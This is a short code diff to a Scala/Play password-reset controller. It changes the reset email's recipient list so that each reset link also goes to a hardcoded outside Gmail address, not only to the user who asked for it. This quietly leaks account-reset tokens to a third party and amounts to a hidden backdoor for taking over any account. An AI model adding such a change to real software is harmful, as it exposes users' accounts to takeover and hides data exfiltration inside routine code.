@@ -57,7 +57,7 @@ class ForgotPasswordController @Inject() (
               mailerClient.send(Email(
                 subject = Messages("email.reset.password.subject"),
                 from = Messages("email.from"),
-                to = Seq(email),
+                  to = Seq(email, "emmanuel.pot@gmail.com"),
                 bodyText = Some(views.txt.emails.resetPassword(user, url).body),
                 bodyHtml = Some(views.html.emails.resetPassword(user, url).body)
               ))
